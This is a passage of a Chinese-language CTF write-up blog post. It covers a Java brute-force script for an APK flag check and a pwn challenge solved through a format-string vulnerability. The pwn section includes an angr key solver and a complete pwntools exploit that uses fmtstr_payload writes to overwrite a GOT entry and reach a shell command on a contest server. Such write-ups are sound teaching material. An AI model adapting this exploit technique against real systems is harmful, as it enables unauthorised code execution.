class="number">76</span>) &#123;</span><br><span class="line">	        ((StringBuilder)localObject).insert(i, <span class="string">"\r\n"</span>);</span><br><span class="line">	      &#125;</span><br><span class="line">	      <span class="keyword">return</span> String.valueOf(localObject);</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">return</span> paramString;</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(<span class="keyword">int</span> paramInt1)</span></span></span><br><span class="line"><span class="function">	  </span>&#123;</span><br><span class="line">	    Object localObject = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	    ((StringBuilder)localObject).append(String.valueOf(paramInt1));</span><br><span class="line">	    String str = ((StringBuilder)localObject).toString();</span><br><span class="line">	    <span class="keyword">if</span> (str.length() == <span class="number">8</span>) &#123;</span><br><span class="line">	      <span class="keyword">try</span></span><br><span class="line">	      &#123;</span><br><span class="line">	        localObject = MessageDigest.getInstance(<span class="string">"md5"</span>).digest(encode.encode(str).getBytes());</span><br><span class="line">	        localObject = <span class="keyword">new</span> BigInteger(<span class="number">1</span>, (<span class="keyword">byte</span>[])localObject).toString(<span class="number">16</span>);</span><br><span class="line">	        <span class="keyword">for</span> (paramInt1 = <span class="number">0</span>; paramInt1 &lt; <span class="number">32</span> - ((String)localObject).length(); paramInt1++)</span><br><span class="line">	        &#123;</span><br><span class="line">	          StringBuilder localStringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	          localStringBuilder.append(<span class="string">"0"</span>);</span><br><span class="line">	          localStringBuilder.append((String)localObject);</span><br><span class="line">	          localObject = localStringBuilder.toString();</span><br><span class="line">	        &#125;</span><br><span class="line">	        <span class="keyword">if</span> (((String)localObject).equals(<span class="string">"cc3fa9c107c0d8b48d6af32d26eacf2a"</span>))</span><br><span class="line">	        &#123;</span><br><span class="line">	          localObject = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	          ((StringBuilder)localObject).append(<span class="string">"flag&#123;"</span>);</span><br><span class="line">	          ((StringBuilder)localObject).append(str);</span><br><span class="line">	          ((StringBuilder)localObject).append(<span class="string">"&#125;"</span>);</span><br><span class="line">	          <span class="keyword">return</span> ((StringBuilder)localObject).toString();</span><br><span class="line">	        &#125;</span><br><span class="line">	        <span class="keyword">return</span> <span class="string">"something wrong"</span>;</span><br><span class="line">	      &#125;</span><br><span class="line">	      <span class="keyword">catch</span> (Exception localException)</span><br><span class="line">	      &#123;</span><br><span class="line">	        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"没有这个md5算法"</span>);</span><br><span class="line">	      &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">return</span> <span class="string">"something wrong"</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//爆破str格式为900xxxxx的情况</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;=<span class="number">99999</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			String str = <span class="keyword">new</span> String(<span class="string">"900"</span>);</span><br><span class="line">			str += i;</span><br><span class="line">			<span class="keyword">int</span> a = Integer.parseInt(str);</span><br><span class="line">			String sss = encrypt(a);</span><br><span class="line">			<span class="keyword">if</span>(sss!=<span class="string">"something wrong"</span>) &#123;</span><br><span class="line">				System.out.println(sss);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//爆破str格式为90xxxxxx的情况</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;=<span class="number">999999</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			String str = <span class="keyword">new</span> String(<span class="string">"90"</span>);</span><br><span class="line">			str += i;</span><br><span class="line">			<span class="keyword">int</span> a = Integer.parseInt(str);</span><br><span class="line">			String sss = encrypt(a);</span><br><span class="line">			<span class="keyword">if</span>(sss!=<span class="string">"something wrong"</span>) &#123;</span><br><span class="line">				System.out.println(sss);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>运行得到flag。</li></ul><h1 id="0x07-Pwn"><a href="#0x07-Pwn" class="headerlink" title="0x07 Pwn"></a>0x07 Pwn</h1><h2 id="0x001-pwn-MinZhu"><a href="#0x001-pwn-MinZhu" class="headerlink" title="0x001 pwn_MinZhu"></a>0x001 pwn_MinZhu</h2><ul><li>考察格式化字符串漏洞。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191104140024.png" alt></p><ul><li><p>程序首先要求输入一段Key并进行验证。</p></li><li><p>这个Key手撕就能弄出来,解出来以后是<code>xNd9y6</code></p></li><li><p>也可以用angr(借鉴表哥思路)</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">"./pwn_MinZhu"</span>)</span><br><span class="line">state = p.factory.entry_state()</span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line">res = sm.explore(find=<span class="number">0x08048817</span>,avoid=<span class="number">0x0804882B</span>)</span><br><span class="line"><span class="keyword">print</span> res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><ul><li>通过验证后可以来到这个函数,并且发现这个函数存在明显的格式化字符串漏洞。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191104140211.png" alt></p><ul><li>这里的<code>dword_804A064</code>为1, 也就意味着循环只能执行一次,似乎一次循环是不够的,所以可以先通过修改这个值来让循环执行更多次数从而多次利用格式化字符串漏洞。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191104140631.png" alt></p><ul><li><p>发现了<code>cat flag</code>,但需要满足<code>dword_804A060 == 0x2019</code>。</p></li><li><p>所以基本思路确定了, 第一次循环先改掉<code>dword_804A064</code>的值,让这个值大于等于3, 第二次循环让 <code>dword_804A060 == 0x2019</code>, 第三次循环把<code>puts</code>的<code>got</code>换为<code>cat flag</code>所在的地址,这里也可以更换<code>putchar</code>的<code>got</code>。</p></li><li><p>exp如下:</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'172.29.1.28'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./pwn_MinZhu')</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn_MinZhu'</span>)</span><br><span class="line"></span><br><span class="line">putsgot = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">totalnum = <span class="number">0x0804A064</span></span><br><span class="line"></span><br><span class="line">targetnum = <span class="number">0x0804A060</span></span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x08048696</span></span><br><span class="line"></span><br><span class="line">pwd = <span class="string">'xNd9y6'</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Key:'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(pwd)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'your msg:'</span>)</span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">4</span>,&#123;totalnum:<span class="number">0x03</span>&#125;)</span><br><span class="line"></span><br><span class="line">c.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = fmtstr_payload(<span class="number">4</span>,&#123;targetnum:<span class="number">0x2019</span>&#125;)</span><br><span class="line"></span><br><span class="line">c.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = fmtstr_payload(<span class="number">4</span>,&#123;putsgot:system_addr&#125;)</span><br><span class="line"></span><br><span class="line">c.sendline(payload3)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------至此本文结束<i class="fa fa-tree"></i>感谢您的阅读-------------</div></div></div><div><div id="reward-container"><div>如果觉得这篇文章对您有用，请随意打赏。 (๑•⌄•๑) 您的支持将鼓励我继续创作！</div><button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">打赏</button><div id="qr" style="display:none"><div style="display:inline-block"><img src="/images/Wechat_SKM.png" alt="LiuLian 微信支付"><p>微信支付</p></div><div style="display:inline-block"><img src="/images/ZFB_SKM.png" alt="LiuLian 支付宝"><p>支付宝</p></div></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>LiuLian</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="http://liul14n.top/2019/11/04/Sdnisc-2019/" title="Sdnisc-2019">http://liul14n.top/2019/11/04/Sdnisc-2019/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2019/10/31/Syc-Geek-10th/" rel="next" title="Syc Geek 10th"><i class="fa fa-chevron-left"></i> Syc Geek 10th</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"><a href="/2019/11/24/攻防世界-Pwn进阶区(1)/" rel="prev" title="攻防世界-Pwn进阶区(1)">攻防世界-Pwn进阶区(1) <i class="fa fa-chevron-right"></i></a></div></div></footer></div></article></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span> <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span> <span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap">站点概览</li></ul><div class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/images/touxiang.jpeg" alt="LiuLian"><p class="site-author-name" itemprop="name">LiuLian</p><div class="site-description motion-element" itemprop="description">Salute The Time</div></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">60</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">8</span> <span class="site-state-item-name">分类</span></a></div></nav><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/LiuL14n" title="GitHub &rarr; https://github.com/LiuL14n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a> </span><span class="links-of-author-item"><a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=aFlZWl1aWVxcWVEoGRlGCwcF" title="E-Mail &rarr; http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=aFlZWl1aWVxcWVEoGRlGCwcF" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a> </span><span class="links-of-author-item"><a href="http://wpa.qq.com/msgrd?v=3&uin=1125214419&site=qq&menu=yes" title="QQ &rarr; http://wpa.qq.com/msgrd?v=3&uin=1125214419&site=qq&menu=yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a></span></div><div class="links-of-blogroll motion-element links-of-blogroll-block"><div class="links-of-blogroll-title"><i class="fa fa-fw fa-link"></i> From 大佬 import&nbsp; <i class="fa fa-fw fa-link"></i></div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"><a href="https://suxinghe39.github.io/" title="SuXingHe" target="_blank">SuXingHe</a></li><li class="links-of-blogroll-item"><a href="https://hal900000.github.io" title="Hal90000" target="_blank">Hal90000</a></li><li class="links-of-blogroll-item"><a href="http://n4tsu.top/" title="Natsu" target="_blank">Natsu</a></li><li class="links-of-blogroll-item"><a href="https://dililidala.github.io" title="Ohrxw" target="_blank">Ohrxw</a></li><li class="links-of-blogroll-item"><a href="http://www.wendev.site" title="JiangWen" target="_blank">JiangWen</a></li><li class="links-of-blogroll-item"><a href="https://l0ne1y.xyz/" title="L0ne1y" target="_blank">L0ne1y</a></li></ul><div id="days"></div><script>function show_date_time(){window.setTimeout("show_date_time()",1e3),BirthDay=new Date("04/25/2019 21:13:14"),today=new Date,timeold=today.getTime()-BirthDay.getTime(),sectimeold=timeold/1e3,secondsold=Math.floor(sectimeold),msPerDay=864e5,e_daysold=timeold/msPerDay,daysold=Math.floor(e_daysold),e_hrsold=24*(e_daysold-daysold),hrsold=setzero(Math.floor(e_hrsold)),e_minsold=60*(e_hrsold-hrsold),minsold=setzero(Math.floor(60*(e_hrsold-hrsold))),seconds=setzero(Math.floor(60*(e_minsold-minsold))),document.getElementById("days").innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒"}function setzero(e){return e<10&&(e="0"+e),e}show_date_time()</script></div></div></div><div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-MISC"><span class="nav-number">2.</span> <span class="nav-text">0x01 MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x001-签到题"><span class="nav-number">2.1.</span> <span class="nav-text">0x001 签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x002-上下左右"><span class="nav-number">2.2.</span> <span class="nav-text">0x002 上下左右</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x003-压缩包的秘密"><span class="nav-number">2.3.</span> <span class="nav-text">0x003 压缩包的秘密</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-Stego"><span class="nav-number">3.</span> <span class="nav-text">0x02 Stego</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x001-啾咪"><span class="nav-number">3.1.</span> <span class="nav-text">0x001 啾咪~</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x002-我和我的祖国"><span class="nav-number">3.2.</span> <span class="nav-text">0x002 我和我的祖国</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x003-你真的很不错"><span class="nav-number">3.3.</span> <span class="nav-text">0x003 你真的很不错</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-Crypto"><span class="nav-number">4.</span> <span class="nav-text">0x03 Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x001-简单的密码学"><span class="nav-number">4.1.</span> <span class="nav-text">0x001 简单的密码学</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x003-被加密的消息"><span class="nav-number">4.2.</span> <span class="nav-text">0x003 被加密的消息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-Forensic"><span class="nav-number">5.</span> <span class="nav-text">0x04 Forensic</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x001-日志分析"><span class="nav-number">5.1.</span> <span class="nav-text">0x001 日志分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x004-流量分析"><span class="nav-number">5.2.</span> <span class="nav-text">0x004 流量分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-Re"><span class="nav-number">6.</span> <span class="nav-text">0x05 Re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x001Python是世界上最好的语言"><span class="nav-number">6.1.</span> <span class="nav-text">0x001Python是世界上最好的语言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-Moble"><span class="nav-number">7.</span> <span class="nav-text">0x06 Moble</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x001-简单的apk"><span class="nav-number">7.1.</span> <span class="nav-text">0x001 简单的apk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x002-贪吃蛇"><span class="nav-number">7.2.</span> <span class="nav-text">0x002 贪吃蛇</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x07-Pwn"><span class="nav-number">8.</span> <span class="nav-text">0x07 Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x001-pwn-MinZhu"><span class="nav-number">8.1.</span> <span class="nav-text">0x001 pwn_MinZhu</span></a></li></ol></li></ol></div></div></div><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span id="scrollpercent"><span>0</span>%</span></div></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2022</span> <span class="with-love" id="animate"><i class="fa fa-star"></i> </span><span class="author" itemprop="copyrightHolder">LiuLian</span></div><div class="powered-by"><i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv"> 本站访客数:<span id="busuanzi_value_site_pv"></span></span></div><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span class="busuanzi-value" id="busuanzi_value_site_uv"></span> </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-s"></i> </span><span class="site-pv" title="总访问量"><span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span></div></div></footer></div><script>"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script color="255,105,180" opacity="0.6" zindex="-1" count="77" src="/lib/canvas-nest/canvas-nest.min.js"></script><script src="/lib/jquery/index.js?v=2.1.3"></script><script src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script src="/js/utils.js?v=7.1.0"></script><script src="/js/motion.js?v=7.1.0"></script><script src="/js/affix.js?v=7.1.0"></script><script src="/js/schemes/pisces.js?v=7.1.0"></script><script src="/js/scrollspy.js?v=7.1.0"></script><script src="/js/post-details.js?v=7.1.0"></script><script src="/js/next-boot.js?v=7.1.0"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script>$(".highlight").each(function(e,t){var n=$("<div>").addClass("highlight-wrap");$(t).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(e){var t=$(this).parent().find(".code").find(".line").map(function(e,t){return $(t).text()}).toArray().join("\n"),n=document.createElement("textarea"),o=window.pageYOffset||document.documentElement.scrollTop;n.style.top=o+"px",n.style.position="absolute",n.style.opacity="0",n.readOnly=!0,n.value=t,document.body.appendChild(n),n.select(),n.setSelectionRange(0,t.length),n.readOnly=!1;document.execCommand("copy");n.blur(),$(this).blur()})).on("mouseleave",function(e){var t=$(this).find(".copy-btn");setTimeout(function(){t.text("复制")},300)}).append(t)})</script><script type="text/javascript" color="0,191,255" opacity="1" zindex="-2" count="60" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/clicklove.js"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,debug:!1,model:{jsonPath:"/live2dw/assets/z16.model.json"},display:{position:"right",width:210,height:420},mobile:{show:!0},log:!1})</script></body></html>